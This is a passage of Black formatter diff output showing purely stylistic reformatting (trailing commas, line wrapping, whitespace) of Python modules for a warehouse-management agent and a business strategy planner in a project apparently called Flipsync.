-            confidence_score=0.3
+            confidence_score=0.3,
         )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/risk_assessor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/warehouse_agent.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/warehouse_agent.py	2025-06-19 04:03:40.137745+00:00
@@ -86,11 +86,11 @@
         self.metrics = WarehouseMetrics()
         self.optimization_rules: Dict[str, Any] = {
             "fast_moving_items_near_dock": True,
             "heavy_items_ground_level": True,
             "fragile_items_secure_zones": True,
-            "seasonal_items_flexible_zones": True
+            "seasonal_items_flexible_zones": True,
         }
 
         logger.info(f"WarehouseAgent {agent_id} initialized")
 
     async def add_warehouse_location(
@@ -99,11 +99,11 @@
         zone: str,
         aisle: str,
         shelf: str,
         bin: str,
         capacity: int,
-        accessibility_score: float = 1.0
+        accessibility_score: float = 1.0,
     ) -> WarehouseLocation:
         """
         Add a new warehouse location.
 
         Args:
@@ -123,11 +123,11 @@
             zone=zone,
             aisle=aisle,
             shelf=shelf,
             bin=bin,
             capacity=capacity,
-            accessibility_score=accessibility_score
+            accessibility_score=accessibility_score,
         )
 
         self.warehouse_locations[location_id] = location
         self._update_metrics()
 
@@ -148,44 +148,48 @@
         slow_moving_items = self._identify_slow_moving_items()
 
         # Generate recommendations
         for item_type, locations in slow_moving_items.items():
             if any(loc.zone in high_traffic_zones for loc in locations):
-                recommendations.append({
-                    "type": "relocate_slow_moving",
-                    "item_type": item_type,
-                    "current_zones": [loc.zone for loc in locations],
-                    "recommended_zones": self._get_low_traffic_zones(),
-                    "reason": "Move slow-moving items away from high-traffic areas"
-                })
+                recommendations.append(
+                    {
+                        "type": "relocate_slow_moving",
+                        "item_type": item_type,
+                        "current_zones": [loc.zone for loc in locations],
+                        "recommended_zones": self._get_low_traffic_zones(),
+                        "reason": "Move slow-moving items away from high-traffic areas",
+                    }
+                )
 
         # Check for heavy items on upper shelves
         for location in self.warehouse_locations.values():
             if location.shelf.startswith("upper") and location.current_stock > 0:
                 # Check if heavy items are stored here
                 if self._has_heavy_items(location):
-                    recommendations.append({
-                        "type": "relocate_heavy_items",
-                        "location": location.location_id,
-                        "reason": "Move heavy items to ground level for safety"
-                    })
+                    recommendations.append(
+                        {
+                            "type": "relocate_heavy_items",
+                            "location": location.location_id,
+                            "reason": "Move heavy items to ground level for safety",
+                        }
+                    )
 
         optimization_result = {
             "recommendations": recommendations,
             "current_efficiency": self._calculate_layout_efficiency(),
-            "potential_improvement": len(recommendations) * 0.05,  # 5% per recommendation
-            "timestamp": datetime.utcnow().isoformat()
+            "potential_improvement": len(recommendations)
+            * 0.05,  # 5% per recommendation
+            "timestamp": datetime.utcnow().isoformat(),
         }
 
-        logger.info(f"Generated {len(recommendations)} storage optimization recommendations")
+        logger.info(
+            f"Generated {len(recommendations)} storage optimization recommendations"
+        )
         return optimization_result
 
     async def create_picking_task(
-        self,
-        order_id: str,
-        items: List[Dict[str, Any]],
-        priority: str = "normal"
+        self, order_id: str, items: List[Dict[str, Any]], priority: str = "normal"
     ) -> PickingTask:
         """
         Create a new picking task.
 
         Args:
@@ -201,16 +205,18 @@
 
         task = PickingTask(
             order_id=order_id,
             items=items,
             priority=priority,
-            estimated_time=estimated_time
+            estimated_time=estimated_time,
         )
 
         self.picking_tasks[str(task.task_id)] = task
 
-        logger.info(f"Created picking task for order {order_id} with {len(items)} items")
+        logger.info(
+            f"Created picking task for order {order_id} with {len(items)} items"
+        )
         return task
 
     async def optimize_picking_route(self, task_id: str) -> Dict[str, Any]:
         """
         Optimize picking route for a task.
@@ -229,17 +235,19 @@
         # Get item locations
         item_locations = []
         for item in task.items:
             location = self._find_item_location(item.get("sku", ""))
             if location:
-                item_locations.append({
-                    "item": item,
-                    "location": location,
-                    "zone": location.zone,
-                    "aisle": location.aisle,
-                    "shelf": location.shelf
-                })
+                item_locations.append(
+                    {
+                        "item": item,
+                        "location": location,
+                        "zone": location.zone,
+                        "aisle": location.aisle,
+                        "shelf": location.shelf,
+                    }
+                )
 
         # Optimize route using zone-based clustering
         optimized_route = self._calculate_optimal_route(item_locations)
 
         # Update estimated time with optimized route
@@ -249,26 +257,34 @@
         route_result = {
             "task_id": task_id,
             "optimized_route": optimized_route,
             "estimated_time": optimized_time,
             "distance_saved": max(0, task.estimated_time - optimized_time),
-            "efficiency_gain": max(0, (task.estimated_time - optimized_time) / task.estimated_time * 100)
+            "efficiency_gain": max(
+                0, (task.estimated_time - optimized_time) / task.estimated_time * 100
+            ),
         }
 
-        logger.info(f"Optimized picking route for task {task_id}, saved {route_result['distance_saved']} minutes")
+        logger.info(
+            f"Optimized picking route for task {task_id}, saved {route_result['distance_saved']} minutes"
+        )
         return route_result
 
     def _identify_high_traffic_zones(self) -> List[str]:
         """Identify high-traffic warehouse zones."""
         zone_access_counts = {}
 
         for location in self.warehouse_locations.values():
             if location.last_accessed:
-                zone_access_counts[location.zone] = zone_access_counts.get(location.zone, 0) + 1
+                zone_access_counts[location.zone] = (
+                    zone_access_counts.get(location.zone, 0) + 1
+                )
 
         # Return top 20% of zones by access count
-        sorted_zones = sorted(zone_access_counts.items(), key=lambda x: x[1], reverse=True)
+        sorted_zones = sorted(
+            zone_access_counts.items(), key=lambda x: x[1], reverse=True
+        )
         high_traffic_count = max(1, len(sorted_zones) // 5)
 
         return [zone for zone, _ in sorted_zones[:high_traffic_count]]
 
     def _identify_slow_moving_items(self) -> Dict[str, List[WarehouseLocation]]:
@@ -295,32 +311,40 @@
     def _has_heavy_items(self, location: WarehouseLocation) -> bool:
         """Check if location contains heavy items."""
         # This would typically check against product database
         # For now, use heuristic based on product types
         heavy_item_keywords = ["furniture", "appliance", "machinery", "equipment"]
-        return any(keyword in product_type.lower()
-                  for product_type in location.product_types
-                  for keyword in heavy_item_keywords)
+        return any(
+            keyword in product_type.lower()
+            for product_type in location.product_types
+            for keyword in heavy_item_keywords
+        )
 
     def _calculate_layout_efficiency(self) -> float:
         """Calculate current warehouse layout efficiency."""
         if not self.warehouse_locations:
             return 0.0
 
         total_efficiency = 0.0
         for location in self.warehouse_locations.values():
             # Factor in utilization and accessibility
-            utilization = location.current_stock / location.capacity if location.capacity > 0 else 0
+            utilization = (
+                location.current_stock / location.capacity
+                if location.capacity > 0
+                else 0
+            )
             efficiency = utilization * location.accessibility_score
             total_efficiency += efficiency
 
         return total_efficiency / len(self.warehouse_locations)
 
     def _estimate_picking_time(self, items: List[Dict[str, Any]]) -> int:
         """Estimate picking time for items in minutes."""
         base_time_per_item = 2  # 2 minutes per item
-        travel_time = len(set(item.get("zone", "A") for item in items)) * 3  # 3 minutes per zone
+        travel_time = (
+            len(set(item.get("zone", "A") for item in items)) * 3
+        )  # 3 minutes per zone
         return len(items) * base_time_per_item + travel_time
 
     def _find_item_location(self, sku: str) -> Optional[WarehouseLocation]:
         """Find warehouse location for an item SKU."""
         # This would typically query inventory database
@@ -328,11 +352,13 @@
         for location in self.warehouse_locations.values():
             if location.current_stock > 0:
                 return location
         return None
 
-    def _calculate_optimal_route(self, item_locations: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    def _calculate_optimal_route(
+        self, item_locations: List[Dict[str, Any]]
+    ) -> List[Dict[str, Any]]:
         """Calculate optimal picking route."""
         # Sort by zone, then aisle, then shelf for efficient picking
         return sorted(item_locations, key=lambda x: (x["zone"], x["aisle"], x["shelf"]))
 
     def _calculate_route_time(self, route: List[Dict[str, Any]]) -> int:
@@ -355,15 +381,19 @@
         """Update warehouse metrics."""
         if not self.warehouse_locations:
             return
 
         total_locations = len(self.warehouse_locations)
-        occupied_locations = sum(1 for loc in self.warehouse_locations.values() if loc.current_stock > 0)
+        occupied_locations = sum(
+            1 for loc in self.warehouse_locations.values() if loc.current_stock > 0
+        )
 
         self.metrics.total_locations = total_locations
         self.metrics.occupied_locations = occupied_locations
-        self.metrics.utilization_rate = occupied_locations / total_locations if total_locations > 0 else 0.0
+        self.metrics.utilization_rate = (
+            occupied_locations / total_locations if total_locations > 0 else 0.0
+        )
         self.metrics.space_efficiency = self._calculate_layout_efficiency()
 
     async def process_message(self, message: Dict[str, Any]) -> None:
         """
         Process incoming message.
@@ -377,11 +407,11 @@
             await self.optimize_storage_layout()
         elif message_type == "create_picking_task":
             await self.create_picking_task(
                 order_id=message.get("order_id", ""),
                 items=message.get("items", []),
-                priority=message.get("priority", "normal")
+                priority=message.get("priority", "normal"),
             )
         elif message_type == "optimize_picking_route":
             await self.optimize_picking_route(message.get("task_id", ""))
         else:
             logger.warning(f"Unknown message type: {message_type}")
@@ -400,11 +430,11 @@
             await self.optimize_storage_layout()
         elif action_type == "create_picking_task":
             await self.create_picking_task(
                 order_id=params.get("order_id", ""),
                 items=params.get("items", []),
-                priority=params.get("priority", "normal")
+                priority=params.get("priority", "normal"),
             )
         else:
             logger.warning(f"Unknown action type: {action_type}")
 
     def get_status(self) -> Dict[str, Any]:
@@ -417,10 +447,12 @@
         return {
             "agent_id": self.agent_id,
             "agent_type": "WarehouseAgent",
             "total_locations": self.metrics.total_locations,
             "utilization_rate": self.metrics.utilization_rate,
-            "active_picking_tasks": len([t for t in self.picking_tasks.values() if t.status != "completed"]),
+            "active_picking_tasks": len(
+                [t for t in self.picking_tasks.values() if t.status != "completed"]
+            ),
             "space_efficiency": self.metrics.space_efficiency,
             "status": "operational",
             "last_activity": datetime.utcnow().isoformat(),
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/warehouse_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/strategy_planner.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/strategy_planner.py	2025-06-19 04:03:40.150768+00:00
@@ -11,21 +11,29 @@
 from decimal import Decimal
 from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass
 
 from fs_agt_clean.core.models.business_models import (
-    StrategicPlan, BusinessInitiative, BusinessObjective, Priority,
-    FinancialMetrics, RiskFactor, DecisionType, RiskLevel,
-    create_financial_metrics, prioritize_initiatives
+    StrategicPlan,
+    BusinessInitiative,
+    BusinessObjective,
+    Priority,
+    FinancialMetrics,
+    RiskFactor,
+    DecisionType,
+    RiskLevel,
+    create_financial_metrics,
+    prioritize_initiatives,
 )
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
 class StrategicGoal:
     """Strategic goal with measurable targets."""
+
     goal_id: str
     name: str
     description: str
     objective: BusinessObjective
     target_value: float
@@ -39,10 +47,11 @@
 
 
 @dataclass
 class MarketAnalysis:
     """Market analysis for strategic planning."""
+
     market_size: Decimal
     growth_rate: float
     competitive_intensity: str
     market_trends: List[str]
     opportunities: List[str]
@@ -52,10 +61,11 @@
 
 
 @dataclass
 class StrategicRecommendation:
     """Strategic planning recommendation."""
+
     plan: StrategicPlan
     confidence_score: float
     reasoning: str
     implementation_roadmap: List[Dict[str, Any]]
     resource_requirements: Dict[str, Any]
@@ -64,312 +74,390 @@
     alternative_strategies: List[str]
 
 
 class StrategyPlanner:
     """Strategic planning engine for business strategy formulation."""
-    
+
     def __init__(self):
         """Initialize the strategy planner."""
         # Strategic frameworks and templates
         self.strategy_frameworks = {
             "growth": {
-                "objectives": [BusinessObjective.REVENUE_GROWTH, BusinessObjective.MARKET_SHARE],
-                "focus_areas": ["market_expansion", "product_development", "customer_acquisition"],
-                "key_metrics": ["revenue_growth_rate", "market_share", "customer_acquisition_cost"]
+                "objectives": [
+                    BusinessObjective.REVENUE_GROWTH,
+                    BusinessObjective.MARKET_SHARE,
+                ],
+                "focus_areas": [
+                    "market_expansion",
+                    "product_development",
+                    "customer_acquisition",
+                ],
+                "key_metrics": [
+                    "revenue_growth_rate",
+                    "market_share",
+                    "customer_acquisition_cost",
+                ],
             },
             "efficiency": {
-                "objectives": [BusinessObjective.COST_REDUCTION, BusinessObjective.OPERATIONAL_EFFICIENCY],
-                "focus_areas": ["process_optimization", "automation", "cost_management"],
-                "key_metrics": ["cost_reduction", "productivity", "operational_efficiency"]
+                "objectives": [
+                    BusinessObjective.COST_REDUCTION,
+                    BusinessObjective.OPERATIONAL_EFFICIENCY,
+                ],
+                "focus_areas": [
+                    "process_optimization",
+                    "automation",
+                    "cost_management",
+                ],
+                "key_metrics": [
+                    "cost_reduction",
+                    "productivity",
+                    "operational_efficiency",
+                ],
             },
             "innovation": {
-                "objectives": [BusinessObjective.INNOVATION, BusinessObjective.BRAND_BUILDING],
-                "focus_areas": ["product_innovation", "technology_advancement", "brand_development"],
-                "key_metrics": ["innovation_index", "brand_value", "new_product_revenue"]
+                "objectives": [
+                    BusinessObjective.INNOVATION,
+                    BusinessObjective.BRAND_BUILDING,
+                ],
+                "focus_areas": [
+                    "product_innovation",
+                    "technology_advancement",
+                    "brand_development",
+                ],
+                "key_metrics": [
+                    "innovation_index",
+                    "brand_value",
+                    "new_product_revenue",
+                ],
             },
             "profitability": {
-                "objectives": [BusinessObjective.PROFIT_MAXIMIZATION, BusinessObjective.REVENUE_GROWTH],
-                "focus_areas": ["margin_improvement", "pricing_optimization", "value_creation"],
-                "key_metrics": ["profit_margin", "roi", "revenue_per_customer"]
-            }
+                "objectives": [
+                    BusinessObjective.PROFIT_MAXIMIZATION,
+                    BusinessObjective.REVENUE_GROWTH,
+                ],
+                "focus_areas": [
+                    "margin_improvement",
+                    "pricing_optimization",
+                    "value_creation",
+                ],
+                "key_metrics": ["profit_margin", "roi", "revenue_per_customer"],
+            },
         }
-        
+
         logger.info("Strategy planner initialized")
-    
+
     async def create_strategic_plan(
         self,
         business_context: Dict[str, Any],
         objectives: List[BusinessObjective],
         time_horizon: str = "1_year",
-        budget_constraints: Optional[Decimal] = None
+        budget_constraints: Optional[Decimal] = None,
     ) -> StrategicRecommendation:
         """
         Create a comprehensive strategic plan.
-        
+
         Args:
             business_context: Current business situation and context
             objectives: Primary business objectives
             time_horizon: Planning time horizon
             budget_constraints: Available budget for initiatives
-            
+
         Returns:
             StrategicRecommendation with complete strategic plan
         """
         try:
             # Analyze current situation
             situation_analysis = await self._analyze_current_situation(business_context)
-            
+
             # Identify strategic opportunities
-            opportunities = await self._identify_opportunities(situation_analysis, objectives)
-            
+            opportunities = await self._identify_opportunities(
+                situation_analysis, objectives
+            )
+
             # Generate strategic initiatives
-            initiatives = await self._generate_initiatives(opportunities, objectives, budget_constraints)
-            
+            initiatives = await self._generate_initiatives(
+                opportunities, objectives, budget_constraints
+            )
+
             # Prioritize initiatives
             prioritized_initiatives = prioritize_initiatives(initiatives)
-            
+
             # Create strategic plan
             strategic_plan = await self._create_plan(
                 prioritized_initiatives, objectives, time_horizon, business_context
             )
-            
+
             # Generate implementation roadmap
             roadmap = await self._create_implementation_roadmap(strategic_plan)
-            
+
             # Assess risks and create mitigation strategies
             risk_mitigation = await self._create_risk_mitigation(strategic_plan)
-            
+
             # Calculate confidence score
-            confidence_score = self._calculate_plan_confidence(strategic_plan, situation_analysis)
-            
+            confidence_score = self._calculate_plan_confidence(
+                strategic_plan, situation_analysis
+            )
+
             # Generate reasoning
-            reasoning = self._generate_plan_reasoning(strategic_plan, situation_analysis)
-            
+            reasoning = self._generate_plan_reasoning(
+                strategic_plan, situation_analysis
+            )
+
             # Define success metrics
             success_metrics = self._define_success_metrics(strategic_plan)
-            
+
             # Generate alternative strategies
-            alternatives = await self._generate_alternative_strategies(objectives, situation_analysis)
-            
+            alternatives = await self._generate_alternative_strategies(
+                objectives, situation_analysis
+            )
+
             return StrategicRecommendation(
                 plan=strategic_plan,
                 confidence_score=confidence_score,
                 reasoning=reasoning,
                 implementation_roadmap=roadmap,
-                resource_requirements=self._calculate_resource_requirements(strategic_plan),
+                resource_requirements=self._calculate_resource_requirements(
+                    strategic_plan
+                ),
                 risk_mitigation=risk_mitigation,
                 success_metrics=success_metrics,
-                alternative_strategies=alternatives
-            )
-            
+                alternative_strategies=alternatives,
+            )
+
         except Exception as e:
             logger.error(f"Error creating strategic plan: {e}")
             # Return basic plan
             return await self._create_fallback_plan(objectives, time_horizon)
-    
-    async def _analyze_current_situation(self, business_context: Dict[str, Any]) -> Dict[str, Any]:
+
+    async def _analyze_current_situation(
+        self, business_context: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Analyze current business situation."""
         analysis = {
             "financial_health": "stable",
             "market_position": "competitive",
             "operational_efficiency": "good",
             "growth_potential": "moderate",
             "competitive_advantages": [],
             "key_challenges": [],
-            "resource_availability": "adequate"
+            "resource_availability": "adequate",
         }
-        
+
         # Analyze financial metrics
         if "financial_metrics" in business_context:
             metrics = business_context["financial_metrics"]
             if isinstance(metrics, dict):
                 revenue = metrics.get("revenue", 0)
                 profit = metrics.get("profit", 0)
-                
+
                 if profit > 0 and revenue > 0:
                     margin = profit / revenue
                     if margin > 0.2:
                         analysis["financial_health"] = "strong"
                     elif margin < 0.05:
                         analysis["financial_health"] = "weak"
-        
+
         # Analyze market context
         if "market_data" in business_context:
             market_data = business_context["market_data"]
             if isinstance(market_data, dict):
                 growth_rate = market_data.get("growth_rate", 0)
                 if growth_rate > 0.1:
                     analysis["growth_potential"] = "high"
                 elif growth_rate < 0:
                     analysis["growth_potential"] = "low"
-        
+
         # Identify competitive advantages
         advantages = []
         if business_context.get("unique_value_proposition"):
             advantages.append("Strong value proposition")
         if business_context.get("customer_satisfaction", 0) > 4.0:
             advantages.append("High customer satisfaction")
         if business_context.get("operational_efficiency", 0) > 0.8:
             advantages.append("Operational excellence")
-        
+
         analysis["competitive_advantages"] = advantages
-        
+
         # Identify challenges
         challenges = []
         if business_context.get("competition_intensity") == "high":
             challenges.append("Intense competition")
         if business_context.get("market_volatility") == "high":
             challenges.append("Market volatility")
         if business_context.get("resource_constraints"):
             challenges.append("Resource limitations")
-        
+
         analysis["key_challenges"] = challenges
-        
+
         return analysis
-    
+
     async def _identify_opportunities(
-        self, 
-        situation_analysis: Dict[str, Any], 
-        objectives: List[BusinessObjective]
+        self, situation_analysis: Dict[str, Any], objectives: List[BusinessObjective]
     ) -> List[Dict[str, Any]]:
         """Identify strategic opportunities."""
         opportunities = []
-        
+
         # Market expansion opportunities
         if BusinessObjective.MARKET_SHARE in objectives:
-            opportunities.append({
-                "type": "market_expansion",
-                "description": "Expand into new market segments",
-                "potential_impact": "high",
-                "investment_required": "medium",
-                "timeline": "6-12 months"
-            })
-        
+            opportunities.append(
+                {
+                    "type": "market_expansion",
+                    "description": "Expand into new market segments",
+                    "potential_impact": "high",
+                    "investment_required": "medium",
+                    "timeline": "6-12 months",
+                }
+            )
+
         # Operational efficiency opportunities
         if BusinessObjective.OPERATIONAL_EFFICIENCY in objectives:
-            opportunities.append({
-                "type": "process_optimization",
-                "description": "Optimize core business processes",
-                "potential_impact": "medium",
-                "investment_required": "low",
-                "timeline": "3-6 months"
-            })
-        
+            opportunities.append(
+                {
+                    "type": "process_optimization",
+                    "description": "Optimize core business processes",
+                    "potential_impact": "medium",
+                    "investment_required": "low",
+                    "timeline": "3-6 months",
+                }
+            )
+
         # Innovation opportunities
         if BusinessObjective.INNOVATION in objectives:
-            opportunities.append({
-                "type": "product_innovation",
-                "description": "Develop innovative products/services",
-                "potential_impact": "high",
-                "investment_required": "high",
-                "timeline": "12-18 months"
-            })
-        
+            opportunities.append(
+                {
+                    "type": "product_innovation",
+                    "description": "Develop innovative products/services",
+                    "potential_impact": "high",
+                    "investment_required": "high",
+                    "timeline": "12-18 months",
+                }
+            )
+
         # Cost reduction opportunities
         if BusinessObjective.COST_REDUCTION in objectives:
-            opportunities.append({
-                "type": "cost_optimization",
-                "description": "Implement cost reduction initiatives",
-                "potential_impact": "medium",
-                "investment_required": "low",
-                "timeline": "3-9 months"
-            })
-        
+            opportunities.append(
+                {
+                    "type": "cost_optimization",
+                    "description": "Implement cost reduction initiatives",
+                    "potential_impact": "medium",
+                    "investment_required": "low",
+                    "timeline": "3-9 months",
+                }
+            )
+
         return opportunities
-    
+
     async def _generate_initiatives(
         self,
         opportunities: List[Dict[str, Any]],
         objectives: List[BusinessObjective],
-        budget_constraints: Optional[Decimal]
+        budget_constraints: Optional[Decimal],
     ) -> List[BusinessInitiative]:
         """Generate strategic initiatives from opportunities."""
         initiatives = []
-        
+
         for i, opportunity in enumerate(opportunities):
             # Estimate investment based on opportunity requirements
             investment_map = {"low": 10000, "medium": 50000, "high": 200000}
-            estimated_cost = Decimal(str(investment_map.get(opportunity["investment_required"], 50000)))
-            
+            estimated_cost = Decimal(
+                str(investment_map.get(opportunity["investment_required"], 50000))
+            )
+
             # Skip if over budget
             if budget_constraints and estimated_cost > budget_constraints:
                 continue
-            
+
             # Estimate ROI based on impact
             impact_roi_map = {"low": 15, "medium": 25, "high": 40}
             estimated_roi = impact_roi_map.get(opportunity["potential_impact"], 25)
-            
+
             # Calculate estimated revenue
             estimated_revenue = estimated_cost * Decimal(str(estimated_roi / 100 + 1))
-            
+
             # Determine priority
-            priority = Priority.HIGH if opportunity["potential_impact"] == "high" else Priority.MEDIUM
-            
+            priority = (
+                Priority.HIGH
+                if opportunity["potential_impact"] == "high"
+                else Priority.MEDIUM
+            )
+
             # Create initiative
             initiative = BusinessInitiative(
                 name=opportunity["description"],
                 description=f"Strategic initiative: {opportunity['description']}",
-                objective=objectives[0] if objectives else BusinessObjective.REVENUE_GROWTH,
+                objective=(
+                    objectives[0] if objectives else BusinessObjective.REVENUE_GROWTH
+                ),
                 priority=priority,
                 estimated_cost=estimated_cost,
                 estimated_revenue=estimated_revenue,
                 estimated_roi=estimated_roi,
                 timeline_months=self._parse_timeline_months(opportunity["timeline"]),
                 required_resources={
                     "budget": float(estimated_cost),
-                    "team_size": 3 if opportunity["investment_required"] == "high" else 2,
-                    "timeline": opportunity["timeline"]
+                    "team_size": (
+                        3 if opportunity["investment_required"] == "high" else 2
+                    ),
+                    "timeline": opportunity["timeline"],
                 },
                 success_metrics=[
                     f"ROI >= {estimated_roi}%",
                     "Implementation within timeline",
-                    "Stakeholder satisfaction >= 80%"
-                ]
-            )
-            
+                    "Stakeholder satisfaction >= 80%",
+                ],
+            )
+
             initiatives.append(initiative)
-        
+
         return initiatives
-    
+
     def _parse_timeline_months(self, timeline: str) -> int:
         """Parse timeline string to months."""
         timeline_lower = timeline.lower()
-        
+
         if "3-6" in timeline_lower:
             return 6
         elif "6-12" in timeline_lower:
             return 12
         elif "12-18" in timeline_lower:
             return 18
         elif "3-9" in timeline_lower:
             return 9
         else:
             return 12  # Default
-    
+
     async def _create_plan(
         self,
         initiatives: List[BusinessInitiative],
         objectives: List[BusinessObjective],
         time_horizon: str,
-        business_context: Dict[str, Any]
+        business_context: Dict[str, Any],
     ) -> StrategicPlan:
         """Create the strategic plan."""
         total_budget = sum(init.estimated_cost for init in initiatives)
         total_revenue = sum(init.estimated_revenue for init in initiatives)
-        expected_roi = float((total_revenue - total_budget) / total_budget * 100) if total_budget > 0 else 0
-        
+        expected_roi = (
+            float((total_revenue - total_budget) / total_budget * 100)
+            if total_budget > 0
+            else 0
+        )
+
         # Create milestones
         milestones = []
         for i, initiative in enumerate(initiatives[:3]):  # Top 3 initiatives
-            milestone_date = datetime.now(timezone.utc) + timedelta(days=30 * (i + 1) * 3)
-            milestones.append({
-                "name": f"Complete {initiative.name}",
-                "date": milestone_date.isoformat(),
-                "description": f"Successfully implement {initiative.name}",
-                "success_criteria": initiative.success_metrics
-            })
-        
+            milestone_date = datetime.now(timezone.utc) + timedelta(
+                days=30 * (i + 1) * 3
+            )
+            milestones.append(
+                {
+                    "name": f"Complete {initiative.name}",
+                    "date": milestone_date.isoformat(),
+                    "description": f"Successfully implement {initiative.name}",
+                    "success_criteria": initiative.success_metrics,
+                }
+            )
+
         return StrategicPlan(
             name=f"Strategic Plan - {time_horizon.replace('_', ' ').title()}",
             description=f"Comprehensive strategic plan focusing on {', '.join(obj.value for obj in objectives)}",
             time_horizon=time_horizon,
             objectives=objectives,
@@ -379,209 +467,268 @@
             key_metrics=[
                 "Revenue growth rate",
                 "Profit margin improvement",
                 "Market share increase",
                 "Customer satisfaction score",
-                "Operational efficiency index"
+                "Operational efficiency index",
             ],
             success_criteria=[
                 f"Achieve {expected_roi:.1f}% ROI",
                 "Complete all high-priority initiatives",
                 "Maintain customer satisfaction > 4.0",
-                "Stay within budget constraints"
+                "Stay within budget constraints",
             ],
             milestones=milestones,
-            status="draft"
-        )
-    
-    async def _create_implementation_roadmap(self, plan: StrategicPlan) -> List[Dict[str, Any]]:
+            status="draft",
+        )
+
+    async def _create_implementation_roadmap(
+        self, plan: StrategicPlan
+    ) -> List[Dict[str, Any]]:
         """Create implementation roadmap."""
         roadmap = []
-        
+
         # Phase 1: Planning and Setup (Month 1-2)
-        roadmap.append({
-            "phase": "Planning & Setup",
-            "timeline": "Months 1-2",
-            "activities": [
-                "Finalize strategic plan approval",
-                "Allocate resources and budget",
-                "Establish project teams",
-                "Set up monitoring systems"
-            ],
-            "deliverables": ["Approved strategic plan", "Resource allocation", "Project charters"],
-            "success_criteria": ["All teams established", "Budget approved", "Systems operational"]
-        })
-        
+        roadmap.append(
+            {
+                "phase": "Planning & Setup",
+                "timeline": "Months 1-2",
+                "activities": [
+                    "Finalize strategic plan approval",
+                    "Allocate resources and budget",
+                    "Establish project teams",
+                    "Set up monitoring systems",
+                ],
+                "deliverables": [
+                    "Approved strategic plan",
+                    "Resource allocation",
+                    "Project charters",
+                ],
+                "success_criteria": [
+                    "All teams established",
+                    "Budget approved",
+                    "Systems operational",
+                ],
+            }
+        )
+
         # Phase 2: Implementation (Month 3-10)
-        roadmap.append({
-            "phase": "Implementation",
-            "timeline": "Months 3-10",
-            "activities": [
-                "Execute high-priority initiatives",
-                "Monitor progress and KPIs",
-                "Adjust strategies as needed",
-                "Regular stakeholder updates"
-            ],
-            "deliverables": ["Initiative completions", "Progress reports", "Performance metrics"],
-            "success_criteria": ["80% of initiatives on track", "KPIs meeting targets"]
-        })
-        
+        roadmap.append(
+            {
+                "phase": "Implementation",
+                "timeline": "Months 3-10",
+                "activities": [
+                    "Execute high-priority initiatives",
+                    "Monitor progress and KPIs",
+                    "Adjust strategies as needed",
+                    "Regular stakeholder updates",
+                ],
+                "deliverables": [
+                    "Initiative completions",
+                    "Progress reports",
+                    "Performance metrics",
+                ],
+                "success_criteria": [
+                    "80% of initiatives on track",
+                    "KPIs meeting targets",
+                ],
+            }
+        )
+
         # Phase 3: Review and Optimization (Month 11-12)
-        roadmap.append({
-            "phase": "Review & Optimization",
-            "timeline": "Months 11-12",
-            "activities": [
-                "Evaluate initiative outcomes",
-                "Measure ROI and success metrics",
-                "Document lessons learned",
-                "Plan next strategic cycle"
-            ],
-            "deliverables": ["Final evaluation report", "ROI analysis", "Next cycle plan"],
-            "success_criteria": ["Target ROI achieved", "All initiatives evaluated"]
-        })
-        
+        roadmap.append(
+            {
+                "phase": "Review & Optimization",
+                "timeline": "Months 11-12",
+                "activities": [
+                    "Evaluate initiative outcomes",
+                    "Measure ROI and success metrics",
+                    "Document lessons learned",
+                    "Plan next strategic cycle",
+                ],
+                "deliverables": [
+                    "Final evaluation report",
+                    "ROI analysis",
+                    "Next cycle plan",
+                ],
+                "success_criteria": [
+                    "Target ROI achieved",
+                    "All initiatives evaluated",
+                ],
+            }
+        )
+
         return roadmap
-    
+
     async def _create_risk_mitigation(self, plan: StrategicPlan) -> List[str]:
         """Create risk mitigation strategies."""
         mitigation_strategies = [
             "Establish regular progress monitoring and review cycles",
             "Maintain contingency budget (10-15% of total budget)",
             "Develop alternative implementation approaches for high-risk initiatives",
             "Create stakeholder communication and engagement plan",
-            "Implement early warning systems for key risk indicators"
+            "Implement early warning systems for key risk indicators",
         ]
-        
+
         # Add specific mitigations based on plan characteristics
         if plan.total_budget > Decimal("100000"):
-            mitigation_strategies.append("Implement phased budget release based on milestone completion")
-        
+            mitigation_strategies.append(
+                "Implement phased budget release based on milestone completion"
+            )
+
         if len(plan.initiatives) > 5:
-            mitigation_strategies.append("Prioritize initiatives and implement in waves to manage complexity")
-        
+            mitigation_strategies.append(
+                "Prioritize initiatives and implement in waves to manage complexity"
+            )
+
         return mitigation_strategies
-    
-    def _calculate_plan_confidence(self, plan: StrategicPlan, situation_analysis: Dict[str, Any]) -> float:
+
+    def _calculate_plan_confidence(
+        self, plan: StrategicPlan, situation_analysis: Dict[str, Any]
+    ) -> float:
         """Calculate confidence score for the strategic plan."""
         base_confidence = 0.7
-        
+
         # Adjust based on financial health
         if situation_analysis.get("financial_health") == "strong":
             base_confidence += 0.1
         elif situation_analysis.get("financial_health") == "weak":
             base_confidence -= 0.2
-        
+
         # Adjust based on number of initiatives
         if len(plan.initiatives) <= 3:
             base_confidence += 0.1
         elif len(plan.initiatives) > 6:
             base_confidence -= 0.1
-        
+
         # Adjust based on expected ROI
         if plan.expected_roi > 30:
             base_confidence += 0.1
         elif plan.expected_roi < 10:
             base_confidence -= 0.1
-        
+
         return max(0.1, min(0.95, base_confidence))
-    
-    def _generate_plan_reasoning(self, plan: StrategicPlan, situation_analysis: Dict[str, Any]) -> str:
+
+    def _generate_plan_reasoning(
+        self, plan: StrategicPlan, situation_analysis: Dict[str, Any]
+    ) -> str:
         """Generate reasoning for the strategic plan."""
         reasoning_parts = []
-        
-        reasoning_parts.append(f"Strategic plan developed for {plan.time_horizon.replace('_', ' ')} horizon.")
-        reasoning_parts.append(f"Plan includes {len(plan.initiatives)} initiatives with expected ROI of {plan.expected_roi:.1f}%.")
-        
+
+        reasoning_parts.append(
+            f"Strategic plan developed for {plan.time_horizon.replace('_', ' ')} horizon."
+        )
+        reasoning_parts.append(
